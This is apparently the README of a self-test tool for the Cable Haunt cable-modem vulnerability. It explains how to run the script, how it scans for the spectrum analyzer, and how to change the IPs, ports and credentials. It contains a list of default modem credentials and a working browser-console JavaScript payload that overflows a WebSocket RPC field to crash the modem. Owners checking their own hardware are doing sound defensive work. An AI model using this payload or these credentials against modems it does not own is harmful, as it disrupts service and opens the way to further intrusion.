# Cable Haunt Test Script
​
This is a script for automatically testing whether your modem is vulnerable for the [Cable Haunt Vulnerability](https://cablehaunt.com). Per default the script will test for the spectrum analyzer with the following parameter, please see below why and how to change it

```
Target IP: '192.168.100.1'
Port Range: 23 - 10000
Test Credentials: [None, "admin:password", 'askey:askey',  "user:Broadcom", 'Broadcom:Broadcom', 'broadcom:broadcom', 'spectrum:spectrum', 'admin:bEn2o#US9s']
```

<p align="center">
<b>ONLY RUN THIS CODE ON HARDWARE YOU OWN</b>​
</p>

False negatives are possible via the script and you could be still be vulnerable even if the script fails. If you find the spectrum analyser manually you can also test whether it is vulnerable by running the following javascript in your browsers console while having the spectrum analyzer open and logged in.
```
exploit = '{"jsonrpc":"2.0","method":"Frontend::GetFrontendSpectrumData","params":{"coreID":0,"fStartHz":' + 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' +',"fStopHz":1000000000,"fftSize":1024,"gain":1},"id":"0"}'
console.log(exploit)


var socket = new WebSocket("ws://192.168.100.1:8080/Frontend", 'rpc-frontend') //Or some other ip and port!!!

socket.onopen = function(e) {
    socket.send(exploit)
};
```
If this crashes your modem, you are vulnerable.
​
## How to run it
First install [pipenv](https://github.com/pypa/pipenv).

```
pipenv install
```

```
pipenv run python test.py
```

## How to it works
The script automatically scans your network to find the spectrum analyzer and tries to establish a connection to the WebSocket. The script will test if the modem rejects requests from an external origin, by setting the header parameters similar to how a browser or other modern client would. If the connection is established, the spectrum analyzer can be reached indirectly from outside the local network and is, at least partly, vulnerable. The script will afterwards, with your permission, send a specially crafted package that reboots the modem if vulnerable. If this happens, the modem is completely vulnerable.
​
## How to change IP and ports
If the script does not find the spectrum analyzer, it could mean that it is not looking at the correct IPs or ports. We have only seen the Spectrum Analyzer being hosted on "192.168.100.1" and "192.168.0.1", which is rarely the default gateway, and the script therefore only scans these IPs per default. However, it is possible that a specific ISP or manufacturer has changed this and we would very much like to know if it happens. The IPs and port range are set as variables in the top of the script so if you want to test more than the default, please change line 20 and 21

```
targets = ['192.168.100.1', '192.168.0.1']
portRange = range(23, 65535)
```

to for instance

```
targets = ['192.168.100.1', '192.168.0.1', '192.168.1.1']
portRange = range(0, 65535)
```

Remember that the more you add, the longer the port scan will take.

## How to change credentials
The spectrum analyzer is sometimes password protected. This is changeable by the ISP and manufacturer and may therefore vary. The script uses a list of default credentials seen in the wild, that are all tried against the endpoints. If the script returns a "401: Unauthorized" on one of the possible target ports, it could mean that your spectrum analyzer uses new unknown credentials. Remember to use common sense here, for instance, you would probably get a 401 on port 80 on your default gateway since this the user interface. You add to the list of credentials that are tested on line 21 of the script.

## Disclaimer
This tool should be used for verification purposes only, and should not be used on equipment you do not own or otherwise is not allowed to destroy.
There are absolutely no guarantees that this tool will detect any vulnerabilities, nor that it will not damage your equipment or cause damage in some other way. USE AT YOUR OWN RISK.
​
## Other Resources
- [**The Cable Haunt website**](https://cablehaunt.com)
- [**Download the technical report**](https://github.com/Lyrebirds/Cable-Haunt-Report/releases/latest/download/report.pdf)
- [**Sagemcom F@st exploit POC**](https://github.com/Lyrebirds/sagemcom-fast-8690-exploit)
